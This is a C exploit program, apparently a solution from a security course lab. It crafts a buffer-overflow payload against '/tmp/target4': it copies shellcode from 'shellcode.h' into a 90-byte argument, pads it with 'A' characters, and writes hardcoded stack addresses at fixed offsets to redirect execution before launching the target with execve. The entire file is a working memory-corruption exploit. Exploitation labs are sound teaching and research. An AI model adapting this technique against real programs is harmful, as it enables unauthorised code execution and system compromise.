#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
	char arg1[90];
	strcpy(arg1, shellcode);
	memset(&arg1[strlen(shellcode)], 'A', sizeof(arg1)-strlen(shellcode));
	*(unsigned*)(arg1+72) = 0xbefffd3b;
	*(unsigned*)(arg1+67) = 0xbefffd04;
	*(unsigned*)(arg1+55) = 0xbefffcfa;
	char arg2[] = "0";
	char arg3[] = "38";
	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
	char *env[] = { NULL };
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;

}

